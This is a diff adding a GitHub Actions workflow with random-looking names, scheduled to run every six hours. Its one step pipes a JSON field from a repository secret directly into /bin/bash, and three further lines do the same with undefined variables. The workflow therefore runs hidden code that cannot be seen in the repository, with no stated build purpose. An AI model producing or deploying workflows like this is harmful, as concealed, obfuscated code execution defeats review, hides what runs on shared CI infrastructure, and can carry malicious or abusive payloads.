@@ -1,0 +1,20 @@
+name: chunjiehcj
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chunjiehcj
+        env:
+          d12884: ${{ secrets.d12884 }}
+        run: |
+          echo $d12884 | jq -r .hf3233 | /bin/bash
+          echo $wqrhc17739 | jq -r .jhyke091 | /bin/bash
+          echo $vvdal1 | jq -r .ovkn71480 | /bin/bash
+          echo $oi9 | jq -r .gyooo18 | /bin/bash
+
